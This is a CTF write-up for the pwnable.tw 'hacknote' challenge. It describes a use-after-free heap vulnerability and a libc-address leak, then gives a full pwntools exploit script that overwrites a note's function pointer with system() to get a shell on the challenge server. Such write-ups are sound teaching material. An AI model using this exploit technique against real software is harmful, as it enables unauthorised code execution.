
# 📌 **hacknote - pwnable.tw**  

## 🔹 **Vulnerability Analysis**  

### 📌 **Vulnerable Function: `FUN_080487d4`**  
The vulnerability exists in the function **`FUN_080487d4`**, which suffers from a **Use-After-Free (UAF)** issue.  

---

### 🛠️ **Breakdown of the Issue**  

- The program allows us to create **a maximum of 5 notes**, where we specify the size of each note, and memory is allocated dynamically from the **heap**.  
- Each allocated note has an **extra seperate 8 bytes** for a function pointer, which is used when printing the note and the buffer ptr for the note description.  
- When a note is **freed**, its reference is **not set to NULL**, leading to **Use-After-Free (UAF)** and potential **Double-Free** vulnerabilities.  
- However, **Double-Free is not exploitable** here since the program restricts note creation to only 5 times.  
- **UAF is useful**, as it allows us to hijack the function pointer and overwrite it to achieve **EIP control**.  

---

## 🏴 **Exploitation Plan**  

### 1️⃣ **Leaking a libc address**  
- Allocate a **200-byte chunk** and then **free it**.
- Allocate a guard chunk to prevent the target chunk from merging with the top chunk upon being freed.
- Since the chunk goes to the **unsorted bin**, the **bk pointer** will leak an address from the **main arena** in libc.  
- Allocate a new chunk smaller than 200 bytes to write the first 4 bytes which are zeroed to leaking the bk pointer (the next 4 bytes).

### 2️⃣ **Hijacking the Function Pointer**  
- Allocate two chunks of random sizes (each greater than 16 bytes) to ensure they don’t end up in the same fastbin bucket (which holds chunks up to 16 bytes). The additional 8 bytes allocated alongside each chunk will help us later retrieve and overwrite the function pointer used for printing the note.
    +-------------------------------+
    |      chunk1 extra 8 bytes      |
    +-------------------------------+
    |  fun ptr  |  chunk1 ptr        |
    +-------------------------------+  <- Chunk 1 metadata
    |        40 bytes               |
    +-------------------------------+
    |      chunk2 extra 8 bytes      |
    +-------------------------------+
    |  fun ptr  |  chunk2 ptr        |
    +-------------------------------+  <- Chunk 2 metadata
    |        40 bytes               |
    +-------------------------------+
    |            TOP                 |  <- Top chunk (wilderness)
    |            ...                 |
    +-------------------------------+
- Free them, and then allocate a new **8-byte chunk**.
      +-------------------------------+
    |    Chunk 3 extra 8 bytes      |
    +-------------------------------+
    |  fun ptr  |  chunk1 ptr        |
    +-------------------------------+  
    |            FREE                |
    +-------------------------------+
    |       Chunk 3 (8 bytes)        |
    +-------------------------------+
    |  system  |        sh           |
    +-------------------------------+  
    |            FREE                |
    +-------------------------------+
    |            TOP                 |  <- Top chunk (wilderness)
    |            ...                 |
    +-------------------------------+
- This allows us to **reclaim a previously freed note’s chunk** from the fastbin.  
- Overwrite the **function pointer** (used for printing notes) with **`system()`**, leading to **EIP control** and **shell execution**.  
- UAF for the previous note to print its content which will result in calling system.
---

## 🔹 **Exploit Code**  
```python
#!/usr/bin/python3.10
from pwn import *

# p = process("./hacknote_patched")
p = remote("chall.pwnable.tw", 10102)

index = 0

def add_note(p, size, note):
    p.sendafter("Your choice :", "1")
    p.sendafter("Note size :", str(size))
    p.sendafter("Content :", note)

def delete_note(p, ind):
    p.sendafter("Your choice :", "2")
    p.sendafter("Index :", str(ind))

def print_node(p, ind, data2recv):
    p.sendafter("Your choice :", "3")
    p.sendafter("Index :", str(ind))
    if data2recv != "" :
	    p.recvuntil("CCCC")
	    return p.recvline()[:-1]


puts_got_addr = 0x804a024


add_note(p, 200, "AAAA")
add_note(p, 40, "BBBB")
delete_note(p, 0)

# Leak libc address
add_note(p, 16, "CCCC")  # Leak libc - 0x175f38 = system
add_note(p, 40, "DDDD")
addr = int.from_bytes(print_node(p, 0, "CCCC"), "little")
system_addr = addr - 0x175f38

print(f"Leaked address: {hex(addr)}")
print(f"System address: {hex(system_addr)}")


delete_note(p, 0)
delete_note(p, 3)
add_note(p, 8, p32(system_addr, "little") + b';sh\x00')
print_node(p, 0, "")

p.interactive()
